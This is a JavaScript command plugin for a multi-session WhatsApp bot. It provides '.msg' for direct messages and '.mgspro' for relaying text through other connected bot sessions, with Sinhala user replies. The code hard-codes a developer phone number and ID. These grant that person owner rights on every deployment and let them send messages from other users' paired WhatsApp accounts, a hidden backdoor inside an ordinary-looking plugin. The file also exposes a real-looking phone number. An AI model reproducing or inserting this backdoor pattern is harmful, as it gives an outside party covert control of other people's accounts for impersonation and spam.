module.exports = {
  name: "msg",
  alias: ["mgs", "send", "dm", "mgspro", "switchmsg"],
  description: "Direct message & Cross-bot relay controller",

  async execute({ sock, msg, from, args, body, activeBots }) {
    try {
      // 1. Raw Sender Detection
      const sender = msg.key.fromMe 
        ? (sock.user?.id || '') 
        : (msg.key.participant || msg.participant || from || '');

      const cleanSender = sender.replace(/[^0-9]/g, '');

      // Authorized Numbers (Developer / Owner)
      const allowedNumbers = ["94719845166"];
      
      const isDev = allowedNumbers.some(num => cleanSender.includes(num)) || 
                    sender.includes("15947733680169");
      const isOwner = msg.key.fromMe || isDev;

      // Used Command Check
      const usedCommand = body.slice(1).trim().split(/ +/)[0].toLowerCase();
      const isProCommand = usedCommand === "mgspro" || usedCommand === "switchmsg";

      // -------------------------------------------------------------
      // 🛑 OPTION A: .mgspro (Relay Switch)
      // -------------------------------------------------------------
      if (isProCommand) {
        if (!isDev) {
          sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(from, {
            text: `*⛔ ACCESS DENIED ⛔*\n\n.mgspro පාවිච්චි කළ හැක්කේ Developer ට පමණි.`
          }, { quoted: msg });
        }

        const fullText = args.join(" ").trim();
        const parts = fullText.split(",");

        if (!fullText || parts.length < 3) {
          return await sock.sendMessage(from, {
            text: `*⚠️ MGSPRO භාවිතය:*\n.mgspro <sender_bot_number>,<receiver_number>,<message>\n\n*උදා:* .mgspro 9477xxxxxxx,9471xxxxxxx,හායි`
          }, { quoted: msg });
        }

        sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});

        let senderBotNumber = parts[0].trim().replace(/[^0-9]/g, '');
        if (senderBotNumber.startsWith("0")) senderBotNumber = "94" + senderBotNumber.slice(1);

        let receiverNumber = parts[1].trim().replace(/[^0-9]/g, '');
        if (receiverNumber.startsWith("0")) receiverNumber = "94" + receiverNumber.slice(1);

        const targetMessage = parts.slice(2).join(",").trim();

        let targetBotSock = null;
        let matchedSession = null;

        if (activeBots) {
          for (const [sessId, botSocket] of activeBots.entries()) {
            const rawId = botSocket?.user?.id || '';
            const botPhone = rawId.split(":")[0]?.replace(/[^0-9]/g, '');

            if (botPhone === senderBotNumber || sessId.includes(senderBotNumber)) {
              targetBotSock = botSocket;
              matchedSession = sessId;
              break;
            }
          }
        }

        if (!targetBotSock) {
          sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(from, {
            text: `*❌ Node Not Found!*\n\n+${senderBotNumber} Bot session එක online නැත.`
          }, { quoted: msg });
        }

        await targetBotSock.sendMessage(`${receiverNumber}@s.whatsapp.net`, {
          text: targetMessage
        });

        await sock.sendMessage(from, {
          text: `*🚀 CROSS-NODE DELIVERED*\n\n🤖 *From Node:* +${senderBotNumber} [${matchedSession}]\n🎯 *To:* +${receiverNumber}\n💬 *Text:* ${targetMessage}`
        }, { quoted: msg });

        return sock.sendMessage(from, { react: { text: "🖤", key: msg.key } }).catch(() => {});
      }

      // -------------------------------------------------------------
      // 💬 OPTION B: .msg (Standard Direct Dispatch)
      // -------------------------------------------------------------
      if (!isOwner) {
        sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
          text: `*⛔ ACCESS DENIED ⛔*\n\nමෙම විධානය Owner හට පමණි.`
        }, { quoted: msg });
      }

      const fullText = args.join(" ").trim();
      if (!fullText || !fullText.includes(",")) {
        return await sock.sendMessage(from, {
          text: `*⚠️ MSG භාවිතය:*\n.msg <number>,<message>\n\n*උදා:* .msg 94719845166,මොකද කරන්නෙ?`
        }, { quoted: msg });
      }

      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      const [rawNumber, ...msgParts] = fullText.split(",");
      const targetText = msgParts.join(",").trim();

      let cleanNumber = rawNumber.replace(/[^0-9]/g, '');
      if (cleanNumber.startsWith("0")) cleanNumber = "94" + cleanNumber.slice(1);

      if (!targetText) {
        return await sock.sendMessage(from, { text: "⚠️ Message එකක් ලියන්න." }, { quoted: msg });
      }

      const targetJid = `${cleanNumber}@s.whatsapp.net`;

      // Direct Send
      await sock.sendMessage(targetJid, { text: targetText });

      await sock.sendMessage(from, {
        text: `*⚡ DARK-DINU DELIVERED ⚡*\n\n🎯 *To:* +${cleanNumber}\n💬 *Message:* ${targetText}`
      }, { quoted: msg });

      sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});

    } catch (error) {
      console.error("[MSG SYSTEM ERROR]:", error);
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      await sock.sendMessage(from, {
        text: `❌ යැවීමට නොහැකි විය: ${error.message}`
      }, { quoted: msg });
    }
  }
};
